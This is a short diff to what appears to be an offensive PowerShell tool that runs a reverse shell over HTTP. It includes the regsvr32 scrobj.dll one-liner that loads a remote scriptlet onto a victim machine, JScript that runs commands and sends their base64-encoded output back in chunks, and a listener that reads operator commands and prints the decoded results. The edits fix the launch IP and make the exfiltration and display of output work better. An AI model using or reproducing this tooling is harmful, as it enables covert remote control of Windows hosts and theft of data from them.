@@ -7,7 +7,7 @@
   
   Simple Reverse Shell over HTTP. Execute Commands on Client.  
   
-  "regsvr32 /u /n /s /i:http://127.0.01/file.sct scrobj.dll"
+  "regsvr32 /u /n /s /i:http://127.0.0.1/file.sct scrobj.dll"
   
   Listening Server IP Address
   
@@ -145,7 +145,7 @@ while ($true) {
 							var so;
 							while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
 							var encoded = Base64Encode(so);
-							var encodedArray = encoded.match(/.{1,256}/g);
+							var encodedArray = encoded.match(/.{1,2048}/g);
 							for(var i = 0; i < encodedArray.length; i++)
 							{
 								try
@@ -175,16 +175,12 @@ while ($true) {
         $message = Read-Host "JS $hostip>"		
     }
     if ($request.Url -match '/recv' -and ($request.HttpMethod -eq "GET") ) { 
-		Write-Host $request.QueryString["b"].ToString() -Fore Green
+		#Write-Host $request.QueryString["b"].ToString() -Fore Green
 		if($request.QueryString["s"].ToString() -eq 0)
 		{
-			Add-Content c:\Tools\test.txt `n`r
-			Add-Content c:\Tools\test.txt $request.QueryString["b"].ToString()
+			Write-Host $([System.Text.Encoding]::ASCII.GetString(([System.Convert]::FromBase64String($request.QueryString["b"].ToString())))) -Fore Green
 		}
-		else
-		{
-			Add-Content c:\Tools\test.txt $request.QueryString["b"].ToString()
-		}
+		
 		
 	}
 	
